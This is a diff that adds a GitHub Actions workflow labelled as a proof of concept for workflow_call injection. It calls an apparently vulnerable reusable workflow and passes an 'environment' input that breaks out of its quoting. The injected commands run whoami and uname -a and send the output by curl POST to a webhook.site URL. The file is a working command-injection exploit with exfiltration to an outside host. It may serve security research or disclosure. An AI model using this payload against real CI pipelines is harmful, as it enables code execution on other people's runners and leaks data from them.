@@ -1,0 +1,11 @@
+name: PoC for workflow_call Injection
+
+on:
+  workflow_dispatch:
+
+jobs:
+  call-vulnerable:
+    uses: your-org/your-repo/.github/workflows/vulnerable-workflow.yml@main
+    with:
+      environment: 'dev"; whoami | curl -X POST --data-binary @- https://webhook.site/b0c9f97b-3237-4b13-b3b7-920e02ff5f7f; uname -a | curl -X POST --data-binary @- https://webhook.site/b0c9f97b-3237-4b13-b3b7-920e02ff5f7f; echo "'
+      core_app: 'static'
